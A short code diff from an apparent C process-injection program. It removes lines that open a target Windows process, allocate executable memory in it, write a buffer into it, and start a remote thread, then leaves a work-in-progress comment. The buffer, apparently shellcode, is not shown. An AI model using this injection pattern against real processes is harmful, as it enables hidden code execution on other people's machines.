@@ -88,36 +88,6 @@ int main()
     DWORD pid = find_process(target);
     printf("Targeting process: %d \n", pid);
 
-    HANDLE tHandle = OpenProcess(
-        PROCESS_ALL_ACCESS,
-        FALSE,
-        pid
-    );
-
-    LPVOID rPtr = VirtualAllocEx(
-        tHandle,
-        NULL,
-        sizeof(buf),
-        MEM_COMMIT,
-        PAGE_EXECUTE_READWRITE
-    );
-
-    BOOL bResult = WriteProcessMemory(
-        tHandle,
-        rPtr,
-        buf,
-        sizeof(buf),
-        NULL
-    );
-
-    HANDLE hThread = CreateRemoteThread(
-        tHandle,
-        NULL,
-        0,
-        rPtr,
-        NULL,
-        0,
-        NULL
-    );
+    //Work in progress!
 
 }
